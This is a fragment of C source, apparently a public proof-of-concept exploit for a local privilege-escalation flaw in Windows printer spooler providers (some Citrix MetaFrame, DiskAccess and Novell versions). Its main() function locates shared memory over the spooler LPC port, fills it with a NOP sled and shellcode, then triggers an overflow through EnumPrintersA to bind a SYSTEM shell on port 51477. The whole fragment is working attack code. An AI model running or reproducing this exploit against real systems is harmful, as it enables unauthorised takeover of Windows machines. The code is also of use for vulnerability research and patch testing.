int main(int argc, char* argv[])
{
  
  unsigned char exploit[BOFSIZE];
  unsigned char buffer[REQUIRED_SIZE];
  DWORD dwSizeNeeded,n=0;
  DWORD datalen=REQUIRED_SIZE;
  LARGE_INTEGER dirs;
  HANDLE hProcess;
  DWORD write;
  char *p,i;
  #define lpLocalAddress dirs.LowPart
  #define lpTargetAddress dirs.HighPart

  printf("[+] Universal exploit for printer spooler providers\n");
  printf("[+] Some Citrix metaframe, DiskAccess and Novel versions are affected\n");
  printf("[+] Exploit by Andres Tarasco - [email protected]\n\n");

  printf("[+] Connecting to spooler LCP port \\RPC Control\\spoolss\n");
  

 
  do {
   dirs=ConnectToLPCPort();
   printf("[+] Trying to locate valid address: Found 0x%8.8x after %i tries\r",lpTargetAddress,n+1);
   if (lpLocalAddress==0){ 
	 printf("\n[-] Unable to connect to spooler LPC port\n"); 
    printf("[-] Check if the service is running\n");
	 exit(0);
   }
   i=lpTargetAddress>>24; // & 0xFF000000 == 0
   n++;
   if (n==MAXLOOPS) {
      printf("\n[-] Unable to locate a valid address after %i tries\n",n);
      printf("[?] Maybe a greater REQUIRED_SIZE should help. Try increasing it\n");
      return(0);
   }
  }while (i!=0);
  
  //printf(" (%i tries)\n",n);
  printf("\n");

  printf("[+] Mapped memory. Client address: 0x%8.8x\n",lpLocalAddress);
  printf("[+] Mapped memory. Server address: 0x%8.8x\n",lpTargetAddress);

 
  i=(lpTargetAddress<<8)>>24;
  //Fill all with rets. who cares where is it.
  memset(exploit,i,sizeof(exploit)); 
  exploit[sizeof(exploit)-1]='\0';

  /*
  memset(exploit,'A',sizeof(exploit)-1);
  exploit[262]= (lpTargetAddress<<8)>>24; //EIP for Diskaccess
  exploit[263]= (lpTargetAddress<<8)>>24; //EIP for Diskaccess
  exploit[264]='\0';
  */
  
  printf("[+] Targeting return address to  : 0x00%2.2X00%2.2X\n",exploit[262],exploit[262]);

  p=(char *)lpLocalAddress;

  memset(&buffer[0],0x90,REQUIRED_SIZE);
  memcpy(&buffer[REQUIRED_SIZE -sizeof(shellcode)-10],shellcode,sizeof(shellcode));
  
  printf("[+] Writting to shared memory...\n");
  if ( (hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId()))!= NULL ) 
  {
    if ( WriteProcessMemory( hProcess, p, &buffer[0], REQUIRED_SIZE, &write )!=0 )
    {
      printf("[+] Written 0x%x bytes \n",write);
      printf("[+] Exploiting vulnerability....\n");
      printf("[+] Exploit complete. Now try to connect to 127.0.0.1:51477\n");
      printf("[+] and check if you are system =)\n");
      EnumPrintersA ( PRINTER_ENUM_NAME, (char *)exploit, 1, NULL, 0, &dwSizeNeeded, &n );
      return(1);
    } else {
       printf("[-] Written 0x%x bytes \n",write);

    }
  } 
  printf("[-] Something failed. Error %i - Good luck next time\n",GetLastError());
  return(0);
}